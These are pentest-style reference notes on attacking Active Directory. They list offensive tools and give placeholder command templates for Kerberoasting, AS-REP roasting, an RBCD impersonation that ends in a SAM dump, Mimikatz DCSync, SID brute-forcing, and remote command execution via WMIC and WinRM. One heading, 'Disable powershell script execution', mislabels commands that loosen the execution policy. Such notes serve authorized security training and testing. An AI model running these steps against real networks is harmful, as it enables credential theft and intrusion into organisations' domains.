    Active Directory Enumeration & Attacks

    Tools

    Tool Description
    PowerView / SharpView A PowerShell tool and a .NET port used for AD situational awareness. Replacements for net* commands, useful for checking access, targeting users/computers, and identifying Kerberoasting/ASREPRoasting targets.
    BloodHound Visually maps AD relationships to plan attack paths. Uses the SharpHound ingestor and a Neo4j database for analysis.
    SharpHound C# data collector gathering extensive AD object information, outputting JSON for BloodHound.
    BloodHound.py Python BloodHound ingestor based on the Impacket toolkit. Works from non-domain-joined hosts.
    Kerbrute Go tool for Kerberos Pre-Authentication enumeration, password spraying, and brute force.
    Impacket toolkit Python toolkit for interacting with network protocols, including many AD enumeration and attack scripts.
    Responder LLMNR, NBT-NS, and MDNS poisoning tool.
    Inveigh.ps1 PowerShell spoofing/poisoning tool similar to Responder.
    C# Inveigh (InveighZero) C# version of Inveigh with an interactive console.
    rpcinfo RPC service enumeration utility.
    rpcclient Samba tool to interact with AD via the remote RPC service.
    CrackMapExec (CME) Enumeration, attack and post-exploitation tool abusing SMB, WMI, WinRM, MSSQL, etc.
    Rubeus C# tool for Kerberos abuse.
    GetUserSPNs.py Impacket script for identifying SPNs tied to user accounts.
    Hashcat Hash cracking tool.
    enum4linux Enumerates Windows & Samba systems.
    enum4linux-ng Modern rework of enum4linux.
    ldapsearch Built-in LDAP query utility.
    windapsearch Python LDAP enumeration script (users, groups, computers).
    DomainPasswordSpray.ps1 PowerShell password spraying tool.
    LAPSToolkit PowerShell toolkit leveraging PowerView to audit/attack LAPS environments.
    smbmap SMB share enumeration tool.
    psexec.py Impacket PsExec-like remote execution tool.
    wmiexec.py Impacket tool for WMI-based remote command execution.
    Snaffler Finds sensitive information on accessible file shares.
    smbserver.py Simple SMB server for file transfers.
    setspn.exe SPN management utility.
    Mimikatz Extracts credentials, performs pass-the-hash, Kerberos ticket operations, etc.
    secretsdump.py Remote SAM & LSA secrets dumper.
    evil-winrm Interactive WinRM shell for Windows hosts.
    mssqlclient.py Impacket MSSQL client for remote interaction.
    noPac.py CVE-2021-42278/42287 exploit for DA impersonation.
    rpcdump.py Impacket RPC endpoint mapper.
    CVE-2021-1675.py PrintNightmare Proof of Concept.
    ntlmrelayx.py SMB relay attack tool.
    PetitPotam.py CVE-2021-36942 coercion attack PoC.
    gettgtpkinit.py Certificate/TGT manipulation tool.
    getnthash.py Retrieves PAC via U2U using an existing TGT.
    adidnsdump DNS enumeration tool for AD environments.
    gpp-decrypt Extracts credentials from Group Policy Preferences.
    GetNPUsers.py ASREPRoasting tool for retrieving AS-REP hashes.

    ticketer.py Kerberos ticket creation/customization tool (Golden Tickets, trust attacks).

    Active Directory Explorer AD viewer/editor supporting snapshots and comparison.
    PingCastle AD security auditing tool based on maturity/risk assessment.
    Group3r Audits GPO security misconfigurations.
    ADRecon AD data extraction tool with Excel reporting for security analysis.

    Disable powershell script execution

    To run PowerShell scripts on a Windows machine, you may need to adjust the execution policy to allow script execution. This is often required for running tools like PowerView or custom scripts during enumeration.

    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
# or
Set-ExecutionPolicy bypass -Scope process

    Users and groups

    Local

    Users

    net user <username> <password> /add : Créé un compte (actif)
net user <username> <password> /add /active:<yes|no> : Créé un compte (inactif)
net user <username> <password> /del : Supprime un compte
net user <username> <password> : Modifie le mot de passe d'un compte
net user <username> /active:<yes|no> : Active/Désactive un compte

    Groups

    net localgroup <groupname> /add : Créé un groupe.
net localgroup <groupname> /del : Supprime un groupe.
net localgroup <groupname> <username> /add : Ajoute un utilisateur a un groupe.
net localgroup <groupname> <username> /del : Retire un utilisateur d'un groupe.

    Kerberos

    Kerberos is the authentication protocol used in Active Directory. The following sections cover various Kerberos-related attacks and operations.

    Ask TGT

    ./Rubeus.exe asktgt /user:<username> /password:<password> /domain:<domain> /dc:<ip-dc> /ptt /nowrap
./Rubeus.exe asktgt /user:<username> /password:<password> /domain:<domain> /dc:<ip-dc> /outfile:<outfile> /nowrap
impacket-getTGT <domain>/<username>:<password> -dc-ip <ip-dc> -debug

    Ask TGS

    ./Rubeus.exe asktgs /domain:<domain> /dc:<ip-dc> /service:<service> /nowrap
KRB5CCNAME=./<username>.ccache impacket-getST <domain>/<username>:<password> -no-pass -k -spn <service> -dc-ip <ip-dc> -debug

    Convert tickets

    impacket-ticketConverter <filename.ccache> <outfile.kirbi>

    Kerberoasting

    ./Rubeus.exe kerberoast /ticket:<tgt-ticket> /user:<username> /domain:<domain> /dc:<ip-dc> /nowrap

    AS-REP Roasting

    ./Rubeus.exe asreproast /user:<username> /domain:<domain> /dc:<ip-dc> /nowrap

    RBCD

    impacket-rbcd -action write <domain>/<vulnerable_user>:<password> -dc-ip <ip-dc> -delegate-to 'DC01$' -delegate-from <controled_computer>
impacket-getST <domain>/<controled_computer>\$:<password> -impersonate Administrator -spn CIFS/DC01.<domain> -dc-ip <ip-dc>
export KRB5CCNAME=$(readlink -f Administrator.ccache)
crackmapexec smb DC01.<domain> -k --use-kcache --sam

    DCSync

    .\mimikatz.exe lsadump::dcsync /domain:<domain> /user:<user>
.\mimikatz.exe lsadump::dcsync /dc:<ip> /domain:<domain> /user:<user>

    Password spread

    nxc ldap <ip> -u <username> -p <password> --users

    SID bruteforce

    impacket-lookupsid <username>:<password>@<ip-dc>

    WMIC

    wmic /node:<targethost> /user:<username> /password:<password> process call create "<command>"

    Invoke-WmiMethod -Credential (Get-Credential) -Computer <targethost> -Class Win32_Process -Name create -Argument "<command>"

    WINRM

    Test port of WinRM

    Test-NetConnection <targethost> -CommonTCPPort WINRM

    Opening new session

    New-PSSession -ComputerName <targethost> -Credential (Get-Credential <domain>\<user>)
Enter-PSSession <id>

    Executing command without opening new session

    Invoke-Command -ComputerName <targethost> -ScriptBlock {<command>}
